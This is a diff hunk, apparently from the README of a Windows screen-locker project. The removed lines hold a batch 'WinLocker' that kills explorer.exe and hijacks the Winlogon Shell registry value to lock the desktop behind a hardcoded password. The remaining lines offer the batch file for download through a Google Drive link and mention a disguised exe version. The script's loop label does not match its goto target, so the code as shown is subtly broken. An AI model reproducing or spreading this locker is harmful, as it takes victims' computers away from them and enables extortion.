@@ -3,28 +3,6 @@
 // Batch-file. //
 /////////////////
 
-Code:
-
-@echo off
-taskkill /im explorer.exe /f >nul
-reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "WinLocker.bat" /f
-color a
-
-
-echo Your Windows OC is locked
-echo Enter Password:
-
-:р
-set /p x=
-if %x%==123321 (echo Windows OC inlocked    //123321 - это пароль
-start explorer
-exit
-) else (
-echo Error
-echo Enter Pass
-)
-goto h
-
 \\\\\Ссылки могут быть не рабочими!!! Скачивать через Releases!!!\\\\
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////
 // Download bath-file: https://drive.google.com/file/d/12Jw0GZSuJMOHGKUSHuhzU7IYLfNsdbo2/view?usp=sharing // - Работает лучше чем ехе-шник, но не замаскирован.
